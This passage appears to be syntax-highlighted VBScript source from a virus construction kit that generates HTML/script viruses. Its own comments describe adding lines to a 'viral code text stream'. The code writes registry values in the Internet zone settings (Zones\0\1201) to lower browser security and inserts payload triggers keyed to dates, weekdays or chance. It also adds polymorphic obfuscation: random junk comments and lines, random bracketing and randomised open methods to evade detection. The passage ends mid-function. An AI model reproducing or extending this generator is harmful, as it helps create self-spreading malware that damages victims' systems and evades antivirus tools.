        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarWSObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".Regwrite"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"""HKCU"</span><span class="sc6">,</span><span class="sc4">"""HKEY_CURRENT_USER"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"" , 0, ""REG_DWORD"""</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AVRegHackB</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.Local.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">VarWSObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".RegWrite"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"""HKLM"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"""HKEY_LOCAL_MACHINE"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"" , 0, ""REG_DWORD"""</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'---------------------------------Conditional Payload Block--------------------------------------
</span><span class="sc0">
</span><span class="sc1">'Inserts the chosen payload trigger conditional statement to the viral code text stream
'And calls the insertion of the payload if appropriate
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">PayLoadCheck</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">Vinfo.Trigger</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"None"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.TriggerOffline.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"location.protocol = ""file:"""</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.Trigger</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Every"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Day"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Day(now) = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.DayValTrig.Value</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Week"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"WeekDay(now) = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.WeekDayTrig.Value</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Misc"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">VInfo.TrigLine.Value</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Rand"</span><span class="sc0">
                </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Int(("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.TrigMax.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" * Rnd) + 1) = 1"</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">RandomAndAdd</span><span class="sc6">(</span><span class="sc7">BaseString</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.PayLoad</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Prepend"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"window.status=""HTML.Prepend /1nternal"")"</span><span class="sc0">
        </span><span class="sc3">else</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertPayLoad</span><span class="sc6">(</span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">Vinfo.PayLoad</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">OR</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> 
            </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"end if"</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'----------------------------------------Misc Procedures-----------------------------------------
</span><span class="sc0">

</span><span class="sc1">'Randomly brackets an argument
</span><span class="sc3">function</span><span class="sc0"> </span><span class="sc7">RandBrack</span><span class="sc6">(</span><span class="sc7">String1</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">RandBrack</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"("</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
    </span><span class="sc3">else</span><span class="sc0">
        </span><span class="sc7">RandBrack</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">

</span><span class="sc1">'Opens a file using the chosen method
'All args are strings
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">OpenFileMethod</span><span class="sc6">(</span><span class="sc7">FilePathName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CreateIt</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.OpenMethod</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"TextFile"</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">OpenUsingText</span><span class="sc6">(</span><span class="sc7">FilePathName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CreateIt</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"TextStream"</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">OpenUsingStream</span><span class="sc6">(</span><span class="sc7">FilePathName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Rand"</span><span class="sc0">
            </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">OpenUsingText</span><span class="sc6">(</span><span class="sc7">FilePathName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CreateIt</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">else</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">OpenUsingStream</span><span class="sc6">(</span><span class="sc7">FilePathName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">select</span><span class="sc0">
</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">


</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">OpenUsingStream</span><span class="sc6">(</span><span class="sc7">FilePathName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarVictFileObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".GetFile("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">FilePathName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarVictFileObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".OpenAsTextStream("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">OpenUsingText</span><span class="sc6">(</span><span class="sc7">FilePathName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CreateIt</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"Set "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".OpenTextFile("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">FilePathName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">IoModeType</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">CreateIt</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">


</span><span class="sc1">'Adds a line to te viral code text stream with a CRLF
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AddLine</span><span class="sc6">(</span><span class="sc7">TabstoAdd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TextToAdd</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc7">TabstoAdd</span><span class="sc0">
        </span><span class="sc7">GenText</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenText</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"   "</span><span class="sc0">
    </span><span class="sc3">next</span><span class="sc0">
    </span><span class="sc7">GenText</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenText</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">TextToAdd</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">LinesCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LinesCount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc7">window.status</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Generating... "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">LinesCount</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" Lines"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Adds a line to the viral code text stream, randomly adding a junk afterwards if checked
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AddCodeLine</span><span class="sc6">(</span><span class="sc7">TextToAdd</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">TextToAdd</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">AND</span><span class="sc0"> </span><span class="sc7">VInfo.JComments.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">JunkString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">" '"</span><span class="sc0">
            </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">20</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">JunkString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">JunkString</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">74</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc6">))</span><span class="sc0">
            </span><span class="sc3">next</span><span class="sc0">
            </span><span class="sc7">TextToAdd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TextToAdd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">JunkString</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TextToAdd</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">AND</span><span class="sc0"> </span><span class="sc7">VInfo.JunkLines.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">JunkString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"'"</span><span class="sc0">
            </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">20</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">JunkString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">JunkString</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">74</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc6">))</span><span class="sc0">
            </span><span class="sc3">next</span><span class="sc0">
            </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">JunkString</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">

</span><span class="sc1">'Parses code into several lines
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AddMultiCodeLine</span><span class="sc6">(</span><span class="sc7">Parsing</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">CurPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc7">Parsing</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Parsing</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0"> 
        </span><span class="sc7">NextPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">CurPos</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Parsing</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">NextPos</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">CurLine</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Parsing</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CurPos</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NextPos</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">CurPos</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">CurLine</span><span class="sc0">
            </span><span class="sc7">CurPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">NextPos</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">NextPos</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
    
</span><span class="sc1">'Randomly returns one of two strings
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc7">String1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">RandString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0">
    </span><span class="sc3">else</span><span class="sc0">
        </span><span class="sc7">RandString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Inserts a conditional statement in random order.
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RandomAndAdd</span><span class="sc6">(</span><span class="sc7">String1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">RandomAndAdd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RandString</span><span class="sc6">(</span><span class="sc4">"if "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" and "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" then"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"if "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" AND "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" then"</span><span class="sc6">)</span><span class="sc0">
